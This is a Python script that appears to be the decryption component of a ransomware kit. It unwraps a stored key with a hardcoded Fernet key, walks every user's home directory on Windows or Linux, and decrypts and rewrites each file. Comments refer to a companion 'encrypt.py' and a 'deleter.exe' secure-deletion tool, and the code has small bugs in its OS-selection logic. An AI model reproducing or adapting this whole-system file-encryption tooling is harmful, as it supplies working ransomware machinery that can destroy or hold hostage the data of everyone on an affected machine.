from cryptography.fernet import Fernet
import os
import subprocess
import platform


WINDOWS_MODE = False
LINUX_MODE = False

#---DETERMINING USER OS---
user_platform = platform.platform().lower()
if "windows" in user_platform:
    WINDOWS_MODE = True
elif "linux" in user_platform:
    LINUX_MODE = True
else:
    pick_os = input("The user OS was not found. Do you want to proceed as linux? (Y/N)")
    if pick_os.lower()=='y':
        LINUX_MODE = True
    elif pick_os.lower=='n':
        print("Exiting Program...")
    else:
        print("Invalid choice")

if (WINDOWS_MODE):
    directory = "C:\\Users\\"
elif (LINUX_MODE):
    directory = "/home/"
    
f2 = Fernet(b'tifk8qG4WC8y5R4N1iYtuuVzll0Le-dEorZKknJreMY=') #Key user to encrypt the main key before saving it
with open('key.key','rb') as file: #Opening the key.key file that should be saved after the encryption, the key must be in the same workspace where the script is being executed
    encrypted_key = file.read() #Getting the encrypted main key from the file

main_key = Fernet(f2.decrypt(encrypted_key)) #Initiation main_key with the decrypted main key


def iterate_directory(directory):
    try:
        for file in os.listdir(directory): #Iterate through all the files and folders in the directory
            filepath = os.path.join(directory, file) #Get the absolute path to the file

            if (os.path.exists(filepath) and ('deleter.exe' not in filepath)): #Check if the absolute path exists, in order to prevent some errors, deleter.exe is an exception so it does not get encrypted
                if os.path.isfile(filepath): #Check if the absolute path leads to a file
                    try:
                        decrypt_file(filepath) #If it is a file, decrypt it
                    except:
                        print("Could not decrypt {} , might already be decrypted".format(filepath))

                elif os.path.isdir(filepath): #Check if the absolute path leads to a directory instead
                    iterate_directory(filepath) #If the object is a directory, resursive call the function to iterate throught it

                else:
                    print("Error while dealing with " + filepath) #If the absolute path does not lead to a file or directory, skip it, sometimes happen with files behind admin access or links
            else:
                print('Could not work with ' + filepath) #If the path does not exists or is deleter.exe, skip it

    except Exception as e: #If an exception occurs anywhere while handling the absolute path, file or directory
        print("Exception: ", e) #Show the exception

def decrypt_file(filepath): 
    print("Decrypting: " + filepath) #Optional print statement to indicate which file is being decrypted
    with open(filepath, 'rb') as file: #Open the file in read binary mode
        binarycontent = file.read() #Get the binary content of the file

    decryptedbinarycontent = main_key.decrypt(binarycontent) #Decrypt the binary content using the key used to encrypt the files
    #The command to use deleter.exe to securely delete the encrypted file here is optional.
    #Deleting the encrypted file should not matter, since the point of this script is restoring the orginals.
    #Therefore, only os.remove() is used, however, optionally, the binary content from deleter.exe can be copied from the encrypt.py script

    os.remove(filepath)
    #command = 'deleter.exe "{}"'.format(filepath) #The command needed to secure delete the file
    #subprocess.call(command, stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT) #Calling the command to delete the encrypted file

    with open(filepath, 'wb') as file: #Open a file, using the absolute path, in write binary mode; create a file that restores the original
        file.write(decryptedbinarycontent) #Write on the file the decrypted content to the restored original

for user in os.listdir(directory): #Get all the users in the C:\\Users\\ directory
    #print("User: ", user, "\n","Path: ", os.path.join(directory, user)) #Optional print statement to show the user and the path being decrypted
    iterate_directory(os.path.join(directory, user)) #Initiate script by calling the iterate_directory function in the home directory